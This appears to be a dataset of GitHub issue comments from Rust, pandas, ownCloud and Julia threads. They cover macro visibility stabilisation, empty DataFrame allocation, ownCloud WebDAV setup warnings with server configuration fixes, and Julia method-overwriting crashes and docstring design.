rust/rust-lang/41022/358519542,"@friend concern if we make further changes to the visibility modifiers as we continue to evolve the module system, will this cause back compat issues here? ",,False,False,41022
rust/rust-lang/41022/358529572,"I would assume that  will continue to match whatever visibility specifiers are added. Such further changes should be carefully designed to avoid introducing ambiguities. On Wed, Jan 17, 2018 at 939 PM, Nick Cameron notifications@friend.com wrote ",,False,False,41022
rust/rust-lang/41022/358803094,"I agree with @friend. This is definitely ""a thing"", but I think that to a large extend these ambiguities exist already. For example, introducing the  modifier and the possibility of paths like  introduced an ambiguity that affects the  visibility specifier -- but also tuple structs (same with  style visibility modifiers). ",,False,False,41022
rust/rust-lang/41022/358803254,@friend thanks for the examples. ,,False,False,41022
rust/rust-lang/41022/370936760,"@friend Was your concern adequately addressed, or do you have more questions? ",,False,False,41022
rust/rust-lang/41022/370984740,"@friend it kind of does. However, we seem to be very close to settling on a final design for modules/visibility reform and it seems to me that waiting another month or so for that before stabilising would be beneficial. Consider the concern resolved if others don't think that meaningfully reduces risk. ",,False,False,41022
rust/rust-lang/41022/371237979,"@friend hmm -- actually -- now that you mention it =) So the main change there (which is not afaik controversial) is that we are going to add  as a keyword. One would expect the behavior of  to change when  is added, which may of course break macros. This is of course nothing new. ( also adds a measure of ambiguity -- at least in some proposals -- in that paths could plausibly begin with .) I continue to regret that we have format specifiers at all. All that said, I'm still sort of inclined to go forward with . We routinely break macros by extending Rust's grammars, sadly enough. But it'd be nice to know what the approved follow-set of  is, I forget. As long as it's suitably narrow, this shouldn't be a big problem. ",,False,False,41022
rust/rust-lang/41022/371247292,"The follow set is currently   all identifiers and keywords except  tokens that  meta-var which is ,  or   We may need to change rule 2 to exclude . But why  is outside of the follow-set while  is in it? Or is it just an oversight? 🤔 ",,False,False,41022
rust/rust-lang/41022/371253306,"I can't say I appreciate the fatalistic attitude of ""well, we're going to break macros and assume there's no opposition"". But in that case, perhaps we should hold off stabilizing vis until  is a keyword? On Wed, Mar 7, 2018 at 203 PM, kennytm notifications@friend.com wrote ",,False,False,41022
rust/rust-lang/41022/371271054,@friend  is already a keyword... ,,False,False,41022
rust/rust-lang/41022/371278017,"Yes, I (and @friend I guess) meant it is going to be accepted as a keyword in a new context. ",,False,False,41022
rust/rust-lang/41022/371534759,"@friend Sorry if I came off too blasé. I'm mostly just embittered with the situation, which I find quite frustrating -- we foresaw the problem, but our solution just didn't work. It annoys me, in part because the simpler solution that we originally had in mind would have worked fine. =) But clearly we are not going to allow this to stop us from modifying our grammar. I hope we can address in Macros 2.0 by changing how fragments work. As far as I know roughly the only scheme that works is to have  consume all token trees until something from the designated ""follow set"" of  is found, and then try to parse those tokens as a , and error if extra tokens are left over. But that's a topic for another thread I suppose. I think it's reasonable. ",,False,False,41022
rust/rust-lang/41022/407896093,"@friend Now that we've come closer to finalizing the modules system under the 2018 edition, do you feel more comfortable resolving your concern here? ",,False,False,41022
rust/rust-lang/41022/408330588,"@friend resolved if we make further changes to the visibility modifiers as we continue to evolve the module system, will this cause back compat issues here? (Assuming that  will match  like ) ",,False,False,41022
rust/rust-lang/41022/408330594,"bell This is now entering its final comment period, as per the review above. bell ",,False,False,41022
rust/rust-lang/41022/410608447,"The final comment period, with a disposition to merge, as per the review above, is now complete. ",,False,False,41022
rust/rust-lang/41022/412674723,This is in need of a stabilization PR! There's a stabilization guide on the forge. Please post here if you plan to take this issue! (I'll circulate it around and see if anyone wants to take it as a good first or third PR) ,,False,False,41022
rust/rust-lang/41022/412676186,"@friend as discussed, I would like to try my hand at doing the stabilisation PR. Will ping if I get stuck ",,False,False,41022
rust/rust-lang/41022/421560504,"This has been stabilized and the reference has been amended, so this seems done. ",,False,False,41022
rust/rust-lang/41022/454071121,"I'm popping in here while trying to more fully document the follow-set rules in the reference, and the  discussion above doesn't quite make sense to me. Was the intent to exclude  from the follow-set of ? Because it is currently in it---both because  has  and because  is an identifier other than non-raw . ",,False,False,41022
pandas/pandas-dev/9216/53822681,"After hours of tearing my hair, I've come to the conclusion that it is impossible to create a mixed dtype DataFrame without copying all of its data in. That is, no matter what you do, if you want to create a mixed dtype DataFrame, you will inevitably create a temporary version of the data (e.g. using np.empty), and the various DataFrame will constructors will always make copies of this temporary. This issue has already been brought up, a year ago  is especially terrible for interoperability with other programming languages. If you plan to populate the data in the DataFrame from e.g. a call to C, the easiest way to do it by far is to create the DataFrame in python, get pointers to the underlying data, which are np.arrays, and pass these np.arrays along so that they can be populated. In this situation, you simply don't care what data the DataFrame starts off with, the goal is just to allocate the memory so you know what you're copying to. This is also just generally frustrating because it implies that in principle (depending potentially on the specific situation, and the implementation specifics, etc) it is hard to guarantee that you will not end up using twice the memory you really should. This has an extremely simple solution that is already grounded in the quantitative python stack have a method analagous to numpy's empty. This allocates the space, but does not actually waste any time writing or copying anything. Since empty is already taken, I would propose calling the method from_empty. It would accept an index (mandatory, most common use case would be to pass np.arange(N)), columns (mandatory, typically a list of strings), types (list of acceptable types for columns, same length as columns). The list of types should include support for all numpy numeric types (ints, floats), as well as special Pandas columns such as DatetimeIndex and Categorical. As an added bonus, since the implementation is in a completely separate method, it will not interfere with the existing API at all. ",,False,False,9216
pandas/pandas-dev/9216/352890655,There are many many threads on SO asking for this feature. It seems to me that all these problem stem from BlockManager consolidating separate columns into a single memory chunks (the 'blocks'). Wouldn't the easiest fix be to not consolidate data into blocks when copy=False is specified. I have a non-consolidating monkey-patched BlockManager    I used to work around this problem. ,,False,False,9216
core/owncloud/2495/12266128,"By connecting to admin account and access to ""Admin"" screen, the following warning is shown Setup Warning Your web server is not yet properly setup to allow files synchronization because the WebDAV interface seems to be broken. Please double check the installation guides. I have this message after an installation with the web-installer. I'm sorry but it still an issue (not resolve as   After an automatic installation, have this kind of message who refer to the manual installation ( in not helpfull for non-developer users. Moreover, the alert don't give enough information to understand what is the trouble. ",,False,False,2495
core/owncloud/2495/15226908,Please read the contribution guidelines ;) ,,False,False,2495
core/owncloud/2495/15229808,"INSTALL 1  Operating system   Linux mini 3.2.0-39-powerpc-smp #62-Ubuntu Web server apache2 Database sqlite PHP version 5.3    version 5.0.0 isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception_NotImplemented' with message 'Not Implemented' in /var/www/cloud/3rdparty/Sabre/DAV/Client.php436 Stack trace #0 /var/www/cloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/cloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/cloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/cloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/cloud/...') #4 [internal function] __lambda_func(Array) #5 /var/www/cloud/lib/router.php(127) call_user_func('?lambda_131', Array) #6 /var/www/cloud/lib/base.php(606) OC_Router-&gt;match('/settings/admin') #7 /var/www/cloud/index.php(28) OChandleRequest() #8 {main} full   2  i tryed here with https and self signed certificate Operating system   Linux apache-11c.w4a.fr 2.6.32-379.22.1.lve1.2.12.el6.x86_64 Web server apache2 Database mysql PHP version 5.3 more info   version 5.0.0 isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request Peer certificate cannot be authenticated with known CA certificates (error code 60)' in /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php412 Stack trace #0 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/route.php(113)  runtime-created function(1) require_once('/datas/vol2/w4a...') #4 [internal function] __lambda_func(Array) #5 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/router.php(127) call_user_func('?lambda_49', Array) #6 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/lib/base.php(606) OC_Router-&gt;match('/settings/admin') #7 /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/index.php(28) OChandleRequest() #8 {main}   21.03.2013 1132 Warning PHP curl_setopt_array() [&lt;a href='function.curl-setopt-array'&gt;function.curl-setopt-array&lt;/a&gt;] CURLOPT_FOLLOWLOCATION cannot be activated when safe_mode is enabled or an open_basedir is set at /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php#464 full  on both install, with same server config, all was worked fine with 4.5* version. Now, sync is impossible with client due to this issue ",,False,False,2495
core/owncloud/2495/15231343,Looks like safe_mode is enabled - please disable that ♠` Warning PHP curl_setopt_array() [function.curl-setopt-array] CURLOPT_FOLLOWLOCATION cannot be activated when safe_mode is enabled or an open_basedir is set at /datas/vol2/w4a134834/var/www/effingo.be/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php#464 ,,False,False,2495
core/owncloud/2495/15231396,Second What version number is in your 3rdparty/Sabre/DAV/Version.php ,,False,False,2495
core/owncloud/2495/15231621,"The sabre version is  '1.7.5' on install 2, it is a mutualized server; i cannot disable safe_mode ",,False,False,2495
core/owncloud/2495/15232029,generally speaking ownCloud cannot run in safe_mode ,,False,False,2495
core/owncloud/2495/15232107,"I'm sorry, i just rechecked safe_mod is off on both install  (as we can see here   &amp; ",,False,False,2495
core/owncloud/2495/15232207,the curl warning is telling a different story ;-) ,,False,False,2495
core/owncloud/2495/15233579,open_basedir can also be the problem ,,False,False,2495
core/owncloud/2495/15243265,"I am also having problem but for MacOSX 1.2.1 Client  is disabled for current user, safe_mode is off ",,False,False,2495
core/owncloud/2495/15257787,"I had the same error, but for me the reason was quite obscure. My webserver is a guest running on private ip address that is NAT'ed at the hosts external interface. A connection from the guest to the public one is ""refused"" so the guest is not able to curl it's own url. Quick fixed by adding a host entry to the private address in /etc/hosts. Need to investigate further why the guest can not connect to the public address (iptables). ",,False,False,2495
core/owncloud/2495/15257866,btw The warning I had was isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request couldn't connect to host (error code 7)' ,,False,False,2495
core/owncloud/2495/15258625,This at the end means your setup is not proper to allow WebDAV and sync clients to work without issues. Fix the setup -&gt; fix webdav and have fun with syncing. Generally speaking the webdav test we have incorporated will give you hints that your web server setup is not proper. We cannot solve all your setup issues and we cannot foresee all configuration combinations. The details error message is always int the logs - we try to help out as good as we can. There are cases where we most probably produce false positives - we will fix this if possible. ,,False,False,2495
core/owncloud/2495/15294265,"My situation appears similar (identical?) to what mrvanes reported. My ownCloud server is NATed with a high port mapped to 443, i.e. connecting to  port forwards to  on my LAN. If I connect to the LAN address, e.g.  I do NOT get the error message. If I connect to the WAN address, I do. ",,False,False,2495
core/owncloud/2495/15507670,"when entering administrator page it says that there is something wrong with the webdav interface and i should consider instructions manual for solving the issue. i double checked, here is everything correct - at least depending on those written in that specifiy manual. webdav also works (syncing at least works) so we may talk about false detection of owncloud. owncloud itself throws this &lt;code&gt; sWebDAVWorking NO - Reason exception 'InvalidArgumentException' with message 'The passed data is not valid XML' in /var/www/slc/htdocs/cloud/3rdparty/Sabre/DAV/Client.php531 Stack trace 0 /var/www/slc/htdocs/cloud/3rdparty/Sabre/DAV/Client.php(181) Sabre_DAV_Client-&gt;parseMultiStatus(false) 1 /var/www/slc/htdocs/cloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) 2 /var/www/slc/htdocs/cloud/settings/admin.php(34) OC_UtilisWebDAVWorking() 3 /var/www/slc/htdocs/cloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/slc/ht...') 4 [internal function] __lambda_func(Array) 5 /var/www/slc/htdocs/cloud/lib/router.php(127) call_user_func('?lambda_908', Array) 6 /var/www/slc/htdocs/cloud/lib/base.php(606) OC_Router-&gt;match('/settings/admin') 7 /var/www/slc/htdocs/cloud/index.php(28) OChandleRequest() 8 {main} &lt;/code&gt; to avoid any silly thoughts like safe_mode on or maybe set open_basedir. both are def. OFF or unset. (safe_mode off and open_basedir isnt set). also to prevent talkings about missing php capabilities im offering for a short time phpinfo ( i understand the defending attitude of developers sometimes because nobody wants to hear something ""bad"" about his ""baby"", but i want to remind that many ppl (look into owncloud board) reported/verified that ""bug"" who have upgraded ONLY owncloud (and didnt touch php or the environment at all). so i would suggest we focus on finding the dirty lil mistake somewhere in the source. ) if you need more information related to php, backend stuff u actually using in your source or may some requirements which are not enlisted in the installation manual, gimme a notice! D best regards Simon PS just edit the ""code"" section for better reading. ",,False,False,2495
core/owncloud/2495/15643887,"I had similar problem. This is because of dynamic dns use. To solve it, simply modify your /etc/hosts file     127.0.0.1 ",,False,False,2495
core/owncloud/2495/15644519,"why should a working network setup be responsible for development mistakes? and why should anyone modifying a working network setup to a wrong configured one because of ONE piece of php code? oO Thanks for the idea, but its not a solution. i prefer the devs do fix this asap among other bugs. ",,False,False,2495
core/owncloud/2495/15684201,"I think I had the same problem  webDav warning in Admin Panel unable to sync with desktop or iPhone client  I think I had the wrong php modules installed or something was missing, because this resolved the problem! the output was this ",,False,False,2495
core/owncloud/2495/15690303,"well im capable syncing, and i do meet the written requirements. no need to blindly install any modules. If you name a particular extension they may ""need"" i can check if i have it enabled or not and may add it to the configuration. blindly installing modules is unprofessional. ",,False,False,2495
core/owncloud/2495/15691876,I know that the solution for my problem is not professional. I am not a professional. But I had luck. So I hope that someone (a developer) may extract some usefull information out of my post to get an solution for the problem. ,,False,False,2495
core/owncloud/2495/15810605,"I upgraded from 4.7 to 5.02 using the upgrade app. Prior to the upgrade my system had no issues. At this point my admin page has the following line at the top of the page Your web server is not yet properly setup to allow files synchronization because the WebDAV interface seems to be broken.    Please double check the installation guides. File synchronization is working however, and so is the Owncloud app on my Android tablet. The log messages at the bottom of the page show Error    core    storage backend \OC\Files\Storage\Dropbox not found     April 2, 2013 1934 Not sure what the Dropbox error is about since I am not using the External Storage app, it's disabled. ",,False,False,2495
core/owncloud/2495/15895573,"I also upgraded from 4.8 to 5.03. With Login https.//myserver444 I have the following warning ""Einrichtungswarnung Dein Web-Server ist noch nicht für Datei-Synchronisation bereit, weil die WebDAV-Schnittstelle vermutlich defekt ist."" Output log isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request couldn't connect to host (error code 7)' in /var/www/html/owncloud/3rdparty/Sabre/DAV/Client.php410 Stack trace #0 /var/www/html/owncloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/html/owncloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/html/owncloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/html/owncloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/html/o...') #4 [internal function] __lambda_func(Array) #5 /var/www/html/owncloud/lib/router.php(127) call_user_func('?lambda_789', Array) #6 /var/www/html/owncloud/lib/base.php(608) OC_Router-&gt;match('/settings/admin') #7 /var/www/html/owncloud/index.php(28) OChandleRequest() #8 {main} Clientsync and Webdav works. With Login  have no warning! ",,False,False,2495
core/owncloud/2495/15964401,"I have the same issue in OC5.0 on my local setup. I use WinXP, Nginx 1.0.12, PHP 5.4.3, MySQL 5. I 've perform some debug of this situation and I found that Sabre DAV Server wait for Authentification header from Sabre DAV Client then it try to connect to server in function isWebDAVWorking() from lib/util.php. But I didn't found any place there Authorization header was sent. I didn't seen the setup warning like in first message, I just seen 504 error instead of it. The $_SERVER['HTTP_AUTHORIZATION'] variable is empty.  Could somebody explain how should work Sabre DAV Server in this case? ",,False,False,2495
core/owncloud/2495/15981716,"Hello I had all the errors above too. I finally got it to work, so the welcome screen to download the app appears without giving an error. How to fix the problem sWebDAVWorking NO - Reason exception 'InvalidArgumentException' with message 'The passed data is not valid XML' in /var/www/slc/htdocs/cloud/3rdparty/Sabre/DAV/Client.php531 Open the file /var/www/owncloud/remote.php got to the last line and change require_once to require Also i add in the /etc/hosts my used dynamic domain to the localhost 127.0.0.1. I added the entry to the host file because my router has a ""nice feature"" it routes all internal requests to my public dynamic ip to the router..... Maybe this helps. ",,False,False,2495
core/owncloud/2495/15989060,I am still have no idea what things makes this WebDAV failed after all of necessary actions is taken  disable all other DAV server like in cPanel disable webdisk webdav mod rewrite on open_basedir are disabled from both apache and php safe_mode is off disable firewall for test  note for a2enmod in owncloud documentation should be marked as 'debian or ubuntu' command. ,,False,False,2495
core/owncloud/2495/16238902,"I only get the message, when i am using https to connect to my owncloud instance ... i would like to use https, but it seems not to work correctly ( ",,False,False,2495
core/owncloud/2495/16239067,"@friend please send a pull request to the documentation repo, its really easy to do ;) ",,False,False,2495
core/owncloud/2495/16353222,"The same problem here. And I have this in my warning log file isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request couldn't connect to host (error code 7)' in /var/www/html/cloud/3rdparty/Sabre/DAV/Client.php410 Stack trace #0 /var/www/html/cloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/html/cloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/html/cloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/html/cloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/html/c...') #4 [internal function] __lambda_func(Array) #5 /var/www/html/cloud/lib/router.php(127) call_user_func('?lambda_8', Array) #6 /var/www/html/cloud/lib/base.php(608) OC_Router-&gt;match('/settings/admin') #7 /var/www/html/cloud/index.php(28) OChandleRequest() #8 {main} ",,False,False,2495
core/owncloud/2495/16431678,@friend your problem is that your webserver can't connect to itself ,,False,False,2495
core/owncloud/2495/16572877,"Same problem too. My warning log file says  isWebDAVWorking NO - Reason exception 'Sabre_DAV_Exception' with message '[CURL] Error while making request Failed connect to host; Connection timed out (error code 7)' in /var/www/localhost/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php410 Stack trace #0 /var/www/localhost/htdocs/owncloud/3rdparty/Sabre/DAV/Client.php(179) Sabre_DAV_Client-&gt;request('PROPFIND', '', '&lt;?xml version=""...', Array) #1 /var/www/localhost/htdocs/owncloud/lib/util.php(590) Sabre_DAV_Client-&gt;propFind('', Array) #2 /var/www/localhost/htdocs/owncloud/settings/admin.php(34) OC_UtilisWebDAVWorking() #3 /var/www/localhost/htdocs/owncloud/lib/route.php(113)  runtime-created function(1) require_once('/var/www/localh...') #4 [internal function] __lambda_func(Array) #5 /var/www/localhost/htdocs/owncloud/lib/router.php(127) call_user_func('?lambda_256', Array) #6 /var/www/localhost/htdocs/owncloud/lib/base.php(608) OC_Router-&gt;match('/settings/admin') #7 /var/www/localhost/htdocs/owncloud/index.php(28) OChandleRequest() #8 {main} OS  Linux Gentoo webserver  lighttpd ",,False,False,2495
core/owncloud/2495/17138160,"I had the same situation as mrvanes and steveAliff.  My ownCloud server is NATed with a high port mapped to 443, i.e. connecting to  port forwards to  on my LAN. Add a line to /etc/hosts 127.0.0.1 myserver.realdomain and execute the iptables command &lt;code&gt; \# iptables -t nat -A OUTPUT -p tcp --dport 8888 -j DNAT --to 127.0.0.1443 &lt;/code&gt; ",,False,False,2495
core/owncloud/2495/17686274,"Hello everyone, who is getting this issue. I've realized, that the strange warning message appears if I use the domain name instead of the IP address (I don't use any forwarding).  to if I change the address as follows  message disappears. So I hope the information will help. ",,False,False,2495
core/owncloud/2495/19854602,I added 'overwritehost' =&gt; '192.168.1.1' into config/config.php $CONFIG array and the message disapeard. Be sure to check if you're behind a NAT like me and whats your internal server address. Here's where I got the tip ,,False,False,2495
core/owncloud/2495/22332842,I’m closing this issue because it has been inactive for a few months. This probably means that the issue is not reproducible or it has been fixed in a newer version. Please reopen if you still encounter this issue with the latest stable version (currently ownCloud 5.0.9) and then please use the issue template. You an also contribute directly by providing a patch – see the developer manual. ) Thank you! ,,False,False,2495
core/owncloud/2495/22837163,"I am using 5.0.10 and the issue is still present. But in my case, I was able to resolve it by fixing my firewall, which runs on the same machine as the server. I already posted the finding somewhere else but essentially, the server is doing an access to itself using its external IP address (i.e. not 127.0.0.1) . If the situation is not allowed by iptables, then the server will time out and eventually serve the page to the browser albeit after a long time...... ",,False,False,2495
core/owncloud/2495/23160177,So what’s the plan of action here? ,,False,False,2495
core/owncloud/2495/24860257,"I came across this too while doing a test-drive install in a VM. The problem was of course with my VM setup. (I used faux vhost name in Apache to mount ownCloud, but forgot to add a corresponding entry in the VM's /etc/hosts, i only had the entry in my bare metal machine's /etc/hosts.) Could you guys add the URL of your test request to the message? If it was present, i'd immediately realize what's going on. Currently it's not visible what kind of check you perform, so it's not obvious how to debug the problem. E.g. Your web server is not yet properly setup to allow files synchronization because the WebDAV interface seems to be broken -- request to "" failed. Please double check the installation guides. ",,False,False,2495
core/owncloud/2495/24864380,"@friend Actually the url that we test shoudn't be important. If you would ""fix"" to this url that you would hide the warning but ownCloud wouldn't work correctly in general because a lot of other services on the internet are still not working. This is the whole point of this warning.  I still think that this warning shoud be shown if full internet access ist not working. This is a feature and not a bug. ",,False,False,2495
core/owncloud/2495/24864407,@friend So this warning helped you to fix a bug in your firewall. I still think that this warning is a useful feature and not a bug. ,,False,False,2495
core/owncloud/2495/24866210,"@friend Yeah absolutely, the warning helped me fix a configuration issue with my VM. It's very useful. My point was that if that warning conained a bit more info, i'd realize what's the problem a bit sooner. Just sayin' ) ",,False,False,2495
core/owncloud/2495/36419112,"I had the same error messages as OP, turns out ownCloud does some requests with empty user agent (bad habit?) and my modsec rules didn't like that so they got blocked. Running pretty much standard OWASP rules. Just adjust them or comment them and error message is gone. ",,False,False,2495
core/owncloud/2495/53950610,"Hi, I'm not sure this should be closed.  The only way I could get the message to disappear on Windows server was to ensure 127.0.0.1 pointed to the website OwnCloud was running on.  That is, in IIS select the site you have OC installed on, open the bindings, Add a new binding with the following values Type http IP Address All assigned Port 80 Host name  (Host name blank) The problem with this approach is it requires the owncloud site to be set to 127.0.0.1. If you run a local  web app on 127.0.0.1, it is no longer available on the same machine as OC. Is it possible to ensure the webdav check using the OC sitename? ",,False,False,2495
julia/JuliaLang/23605/255687670,"Reproduces 100% of the time for me [fatal] This is also 100% reproducible, but you must type each line after line 2 to get the same output [strange] ",,False,False,23605
julia/JuliaLang/23605/327561351,"Well, if you overwrite critical function incorrectly that's exactly what should happen. ",,False,False,23605
julia/JuliaLang/23605/327572992,"Not sure I agree with your claim that that is what exactly what should happen.  I think you mean ""we don't prevent users from overwriting critical functions; doing so may result in gibberish"". Is that the approach being taken with the language in general? ",,False,False,23605
julia/JuliaLang/23605/327575444,"We tend to be permissive, but speaking in such general terms is not really useful. It would be very simple to make it an error to overwrite methods in , for example. It just hasn't seemed very urgent in practice. ",,False,False,23605
julia/JuliaLang/23605/327592038,"Ok, thanks for clarifying. ",,False,False,23605
julia/JuliaLang/23605/327613787,"Here's another piece of code, this time resulting in a segfault.  Is this also in the camp of ""don't write stupid code""? ♠Set{Array{T}}() where {T&lt;Float64}` [segfault] I guess I'm not that clear on what type of crashes are worth reporting given that the code is not supposed to work. ",,False,False,23605
julia/JuliaLang/23605/327614378,None of overwrite base function causing crash are worth reporting. All of other segfaults/hard crashes that's not obviously using unsafe features are worth reporting and  does look like it should have a better error. ,,False,False,23605
julia/JuliaLang/23605/327619012,"@friend We always appreciate bug reports and you should always report any possible issue you run into. Different cases are different. Even if two problems have the same underlying cause that is often not obvious at first. In this case, IIUC, the original problem report did not involve a segfault, whereas your new example does. In any case we absolutely do not take the attitude that nothing is supposed to work and so bug reports are futile. That is not a terribly productive inference to make. ",,False,False,23605
julia/JuliaLang/23605/327646970,"Ok, thanks.  I'll keep reporting then and you guys can ignore at your leisure if i report something that's a known philosophical issue.  Let me know if you want me to open a separate issue for the segfault. ",,False,False,23605
julia/JuliaLang/23605/327647096,Please do. ,,False,False,23605
julia/JuliaLang/23605/327662423,"@friend, there's a notion of ""type piracy"" which not everyone buys into, but if you do not commit type piracy, you are definitely in the clear in the sense of ""your code should not crash Julia"" type piracy is adding a method to a function that doesn't ""belong"" to you for arguments where none of the argument types ""belong"" to you. Or conversely, you are not committing an act of piracy if the function or one of the argument types belongs to you – in other words, you can be certain that what you define cannot conflict with anyone else. In this case, redefining very basic operations like integer comparison is very much type piracy the  operator and the type  belong to Base (i.e. everyone), so changing what  means is going to mess with everything. If you want to define your own  operator which has different behavior, just don't qualify the overload. You can even do so with a fallback to call . ",,False,False,23605
julia/JuliaLang/23605/327671545,"Just to clarify that type piracy is a concept that is related although not a requirement for overwriting low level/ fundamental Base functions. There are other Base functions that you can overwrite for your own types that can cause low level operations involving your type to crash in a bad way. You can get this effect easily with type reflection functions, e.g. There's no type piracy involved here but it's in the same class as overwriting  (i.e. this code ""should"" crash julia). In both cases, Base code assumes certain functions to behave correctly and overwriting them can cause huge trouble. ",,False,False,23605
julia/JuliaLang/8514/44292000,Some good discussion started here. This is to more formerly track integrating the necessary parts into Base since it seems some good consensus is building. @friend @friend ,,False,False,8514
julia/JuliaLang/8514/57187758,I'd be happy to get going on this. Also pinging @friend since he's be the source of some great input here. I'll put together a PR over the next few days. ,,False,False,8514
julia/JuliaLang/8514/57188831,Also pinging @friend who originally suggested to me about Docile.jl as a good starting point. Also @friend has been looking for this. ,,False,False,8514
julia/JuliaLang/8514/57191289,@friend I recommend waiting until I've worked through overhauling Markdown.jl before finalising anything / setting up PRs. There will probably be some technical changes to work out within Docile/Markdown to get the string macros etc. working smoothly. ,,False,False,8514
julia/JuliaLang/8514/57191466,"Yes, just saw your  branch. I'll wait on your changes. ",,False,False,8514
julia/JuliaLang/8514/57198663,"Docile does look quite good. I'm wondering about  Maybe we should add some special syntax to avoid the  How much can we cut down the dependencies?  For point (2), I feel the system should be as lazy as possible, just populating metadata with strings until interaction and display happen. ",,False,False,8514
julia/JuliaLang/8514/57201717,"Special syntax would be nice. The  is providing the  that I'm using to get file and line numbers for metadata. Would be great to retain that info. Docile doesn't really have any dependencies, it's just harvesting strings and metadata. Lexicon's providing the presentation layer. I agree about the laziness -- I don't have any hard numbers, but when I was parsing docstrings during  package loading was quite a bit slower. ",,False,False,8514
julia/JuliaLang/8514/57205775,"Another thing that needs to be hashed out is what non-standard form of markdown we wish to support.  Inline latex, tables, and cross references seem necessary. ",,False,False,8514
julia/JuliaLang/8514/57206612,"@friend CommonMark [1, 2] looks reasonably promising. Inline math is a must-have feature  -- not sure whether that would be part of the spec though. [1]  ",,False,False,8514
julia/JuliaLang/8514/57207138,"HttpServer now uses Docile (thanks to @friend), which could be another interesting case study ",,False,False,8514
julia/JuliaLang/8514/57207454,"That's cool, thanks @friend. Guess I can't make breaking changes now! ",,False,False,8514
julia/JuliaLang/8514/57209268,I think this is the right way to go. I agree with Jeff's point that special syntax would make Docile nicer to work with. ,,False,False,8514
julia/JuliaLang/8514/57217225,"CommonMark doesn't have any standard for embedded equations; see this discussion.   Pandoc's  + heuristic (opening $ can't be followed by whitespace, closing $ can't be followed by a digit or preceded by whitespace) seems like the most widely used at this point, and is what is used in Jupyter/IJulia. ",,False,False,8514
julia/JuliaLang/8514/57218272,My understanding in #3988 was always that there would eventually be a special syntax for this; macros are only for prototyping. ,,False,False,8514
julia/JuliaLang/8514/57270533,"Was syntax ever agreed upon for this? Something along the lines of Where  is a new keyword whose ending keyword is , ,  etc. Or just without the  at all and any unassigned string above a documentable block of code is taken to be a docstring? ",,False,False,8514
julia/JuliaLang/8514/57271405,"Jeff and I just talked about this today and a bare string literal in void context followed by a definition seems like the way to go. This should be lowered by the parser something like this becomes the moral equivalent of this Important points about this approach  parsing has no side-effects – the construction of the documentation structure still occurs when the code is actually evaluated, not when it is parsed. each module has its own  dictionary; this is important for reloading modules. This ends up just appending all the docs for a given name, including separate doc strings for a single generic function.  An open issue is how to handle adding methods to functions from other modules. Does the definition go into the current module's  dict? What symbol is used for the doc key then? ",,False,False,8514
julia/JuliaLang/8514/57279662,Just to comment that it's super-exciting to see momentum on this. Looking forward to seeing what emerges. ,,False,False,8514
julia/JuliaLang/8514/57291521,"Is using  as the key type a necessary requirement? Does doing this not restrict the kind of things that can be documented -- namely individual s of a ? If is instead translated to then you could use the / etc as the key instead of a  -- some adjustments to the -block not shown. Is this approach feasible? For adding docs to methods that are being extended from those in a different module, I'd be in favour of adding them to the current module's . I'd find it a bit odd if the docs I write for a method end up in a different module. ",,False,False,8514
julia/JuliaLang/8514/57297121,"Stefan's proposal looks good to me, but plus one for being either being aware of methods properly or being limited to one docstring per function (as opposed to concatenating each successive dosctring regardless). Another way to do this might be something like i.e. indexing doc strings by type as well as name. Key points in this approach  The redefinition problem is handled at the function level rather than the module level, which means that Redefining functions/methods works in a sane way, as opposed to endlessly concatenating onto the existing doc string This will automatically make reloading modules do the expected thing too, so a module-local  isn't necessary to solve that problem (though it might be useful for other reasons)   It removes the dependency on the order of definitions. So you could do fancy things like making more doc strings for more general methods appear first.  (1.i) is my main concern – redefining functions messing up their own docs is something we could probably live with / work around / ignore, but if we can solve this early it will make for a much better interactive experience, I think. ",,False,False,8514
